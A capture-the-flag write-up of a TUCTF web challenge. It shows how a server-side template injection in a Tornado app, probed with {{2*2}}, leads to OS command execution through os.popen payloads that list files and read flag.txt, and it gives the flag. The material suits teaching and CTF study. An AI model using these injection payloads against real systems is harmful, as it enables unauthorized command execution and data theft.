# And Now, For Something Completely Different(Web) - Writeup

### Question

````
We all know Black Friday is the time for shopping. Can you find us a flag on this online store?

http://chal.tuctf.com:30007/
````

### Answer
Check the source file and you will see the following.

````
<!-- TODO: add /welcome/test -->
````

Access again with the curl command.

````
curl http://chal.tuctf.com:30007/welcome/test

<html>
    <head>
        <title>Welcome test</title>
    </head>
    <body>
        Welcome test
    </body>
</html>
````

Access to the upper directory results in an error.

````
curl http://chal.tuctf.com:30007/welcome/
Traceback (most recent call last):
  File "/usr/local/lib/python2.7/dist-packages/tornado/web.py", line 1488, in _execute
    result = self.prepare()
  File "/usr/local/lib/python2.7/dist-packages/tornado/web.py", line 2223, in prepare
    raise HTTPError(self._status_code)
HTTPError: HTTP 404: Not Found
````


I guess that I use tornado from the error code.
Confirming SSTI vulnerabilities reveals vulnerabilities.

````
http://chal.tuctf.com:30007/welcome/{{2*2}}
Welcome 4
````


If you check with the os command, you can see that flag.txt is located directly under class_website.py.

````
http://chal.tuctf.com:30007/welcome/{%import os%}{{os.popen("ls -al").read()}}

<html>
    <head>
        <title>Welcome {%import os%}{{os.popen(&quot;ls -al&quot;).read()}}</title>
    </head>
    <body>
        Welcome total 40
dr-xr-x--- 1 class class  4096 Nov 28 06:10 .
drwxr-xr-x 1 root  root   4096 Nov 21 23:14 ..
-r-xr-x--- 1 class class 12934 Nov 28 06:10 class_website.py
-r-xr-x--- 1 class class    36 Nov 28 04:23 flag.txt
-r-xr-x--- 1 class class   173 Nov 28 05:29 requirements.txt
dr-xr-x--- 1 class class  4096 Nov 28 04:23 static
dr-xr-x--- 1 class class  4096 Nov 28 04:23 templates

    </body>
</html>
````

Check the contents of flag.txt.

````
http://chal.tuctf.com:30007/welcome/{%import os%}{{os.popen("cat flag.txt").read()}}

<html>
    <head>
        <title>Welcome {%import os%}{{os.popen(&quot;cat flag.txt&quot;).read()}}</title>
    </head>
    <body>
        Welcome TUCTF{4lw4y5_60_5h0pp1n6_f0r_fl465}

    </body>
</html>
````

###### TUCTF{4lw4y5_60_5h0pp1n6_f0r_fl465}
